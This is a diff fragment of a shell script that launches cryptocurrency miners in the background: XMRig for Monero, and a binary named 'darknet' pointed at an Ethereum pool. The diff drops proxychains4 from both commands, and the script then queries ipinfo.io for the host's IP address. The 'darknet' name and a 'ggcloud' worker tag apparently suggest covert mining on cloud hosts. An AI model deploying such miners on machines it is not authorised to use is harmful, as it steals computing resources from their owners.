@@ -20,10 +20,10 @@ done
 
 echo "1GB pages successfully enabled"
 
-proxychains4 ./xmrig --url=$POOL --donate-level=1 --user=$WALLET --pass=worker_name -k --coin=monero --threads $run_thread &
+./xmrig --url=$POOL --donate-level=1 --user=$WALLET --pass=worker_name -k --coin=monero --threads $run_thread &
 #./xmrig --url=$POOL --donate-level=1 --user=$WALLET --pass=ggcloud -k --coin=monero --max-cpu-usage=100 &
 echo "run darknet"
-proxychains4 ./darknet -pool eu1.ethermine.org:4444 -wal $wallet -worker $worker_name -epsw x -mode 1 -log 0 -mport 0 -etha 0 -ftime 55 -retrydelay 1 -tt 79 -tstop 89  -coin eth &
+./darknet -pool eu1.ethermine.org:4444 -wal $wallet -worker $worker_name -epsw x -mode 1 -log 0 -mport 0 -etha 0 -ftime 55 -retrydelay 1 -tt 79 -tstop 89  -coin eth &
 ip=$(curl ipinfo.io)
 while true
 do
